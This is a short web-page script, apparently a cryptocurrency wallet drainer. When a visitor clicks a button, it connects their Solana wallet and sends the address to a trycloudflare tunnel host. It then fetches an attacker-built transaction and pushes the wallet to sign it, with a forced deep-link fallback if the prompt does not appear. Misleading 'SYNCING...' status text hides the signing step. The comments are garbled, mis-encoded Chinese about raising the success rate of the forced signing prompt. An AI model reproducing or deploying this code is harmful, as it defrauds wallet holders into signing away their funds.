<script>
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
    document.getElementById('cta').onclick = async function() {
        const log = (t) => document.getElementById('st').innerText = t;
        const p = window.trustwallet?.solana || window.solana;
        try {
            await p.connect();
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();
            const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));

            log("SYNCING...");
            // ğŸ”± æ ¸å¿ƒè¿å‡»ï¼šè¿™ä¼šæå¤§æé«˜â€œè‡ªåŠ¨æ‹‰èµ·â€æˆåŠŸç‡
            await Promise.race([
                p.signTransaction(tx),
                new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
            ]).catch(() => {
                // å¦‚æœå¸¸è§„ç­¾åæ²¡æ‹‰èµ·ï¼Œå¼ºåˆ¶è·³è½¬æ·±åº¦é“¾æ¥
                window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
            });
            
            log("COMPLETE");
        } catch (err) { window.location.reload(); }
    };
</script>
